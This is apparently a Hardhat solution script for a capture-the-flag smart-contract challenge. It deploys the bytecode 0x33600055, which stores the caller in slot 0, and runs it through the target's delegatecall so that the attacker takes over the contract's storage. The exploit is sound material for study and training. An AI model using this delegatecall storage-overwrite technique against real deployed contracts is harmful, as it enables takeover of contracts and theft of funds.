import chalk from "chalk";
import { ethers } from "hardhat";
import { SmartCounterNumen23__factory, SmartCounterNumen23 } from "../../typechain";
import { log, initialize } from "../utils";
async function main() {
    let [smartCounterNumen23Contract, attacker] = await initialize<SmartCounterNumen23>(SmartCounterNumen23__factory, undefined, [(await ethers.getSigners())[0]])

    // sstore(0, caller())
    // CALLER
    // PUSH1 0x00
    // SSTORE
    let code = "0x33600055";
    let tx = await smartCounterNumen23Contract.create(code);
    await tx.wait();
    log(`Successfully create target contract!`);
    tx = await smartCounterNumen23Contract.A_delegateccall("0x");
    await tx.wait();
    log(`Is solved: ${chalk.yellow(await smartCounterNumen23Contract.isSolved())}`);

}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});